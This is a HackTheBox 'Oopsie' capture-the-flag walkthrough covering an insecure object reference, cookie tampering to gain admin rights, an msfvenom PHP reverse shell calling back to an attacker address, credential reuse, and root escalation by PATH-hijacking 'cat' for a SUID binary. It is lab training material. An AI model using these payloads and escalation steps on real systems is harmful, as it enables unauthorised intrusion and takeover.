# HackTheBox Oopsie
## Scanning
Initial scan

```bash
nmap 10.10.10.28 -oN init_nmap.log
```

Service discovery and default scripts on found ports

```bash
nnamp 10.10.10.28 -sV -sC -p 80,22 -oN portscan_nmap.log
```

## Checking out the website
Website seems to contain `/cdn-cgi/login/script.js` file in sourcecode. Lets check out the `/cdn-cgi/login/` page.

This page does indeed contain a login! Because this box is an extention on previous box, lets try and use the same credentials again.

## Admin interface
We have succesfully logged into the web interface. There is a menu entry `upload` in the menu bar but I can only seem to access it when i have super-admin roles.

I can see some information about my current account on the `account` page. This seems to contain an Access ID, Name and email. The access id seems to be the same as my current cookie!

Inspecting the page even more, the URL seem to contain a query parameter `&id=1`. Lets try and change this.

Changing this shows me the details of other users! Awesome! Maybe we can bruteforce this webpage until we find someone with admin rights. (See bruteforce.py).

After having found the correct user, lets change the cookie. Success! We are now super admin and are able to access the `upload` page.

## Logging into the machine
Let's create a reverse PHP shell using `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.132 LPORT=4242 -f raw -o shell.php`.
Now that we have a reverse shell, lets try and upload it and access the page.

We have now access to the machine as user `www-data`! This user can't really do much though, so lets try and escalate to another user. 

After doing some searching I have found a file named `db.php`. This file seems to contain some SQL user credentials. Because there seems to be a 'reuse credentials' flow (?) in this box, lets try and use these details to login to the system.

Success! We are now user `robert`. This user has more access but is not root. Lets read the `user.txt` flag and move on.

## Priv-esc to root
After doing some searching, I have found a file named `bugtracker`. After inspecting this file using `ltrace` it seems to call `cat` on some files inside `/root/reports`. This means that `cat` must be running using root privs!

After a lot of research online I found out I can change the `cat` command to point to something else (like bash) to priv-esc. So let's do that!

`export PATH=/tmp:$PATH`

`cd /temp/`

`echo '/bin/sh' > cat`

`chmod +x cat`

Alright, lets run the bugtracker again.

Success! We now have a root shell!